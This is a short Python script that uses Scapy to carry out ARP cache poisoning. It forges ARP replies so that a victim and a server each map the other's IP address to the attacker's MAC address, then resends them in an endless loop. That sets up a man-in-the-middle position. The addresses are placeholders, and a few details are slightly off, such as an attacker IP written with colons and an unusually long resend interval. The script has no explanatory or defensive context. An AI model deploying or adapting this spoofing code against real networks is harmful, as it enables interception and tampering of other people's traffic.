from scapy.all import *
import time

macAttacker = "ff:ff:ff:ff:ff:ff"
ipAttacker = "255:255:255:255"

macVictim = "ff:ff:ff:ff:ff:ff"
ipVictim = "255.255.255.255"

macServer = "ff:ff:ff:ff:ff:ff"
ipServer = "255.255.255.255"

arpTo = Ether() / ARP()
arpTo[Ether].src = macAttacker
arpTo[ARP].hwsrc = macAttacker
arpTo[ARP].psrc = ipServer
arpTo[ARP].hwdst = macServer
arpTo[ARP].pdst = ipVictim

arpFrom = Ether() / ARP()
arpFrom[Ether].src = macAttacker
arpFrom[ARP].hwsrc = macAttacker
arpFrom[ARP].psrc = ipVictim
arpFrom[ARP].hwdst = macServer
arpFrom[ARP].pdst = ipServer

while(True):
    sendp(arpFrom, iface="enp0s3")
    sendp(arpTo, iface="enp0s3")
    time.sleep(3600)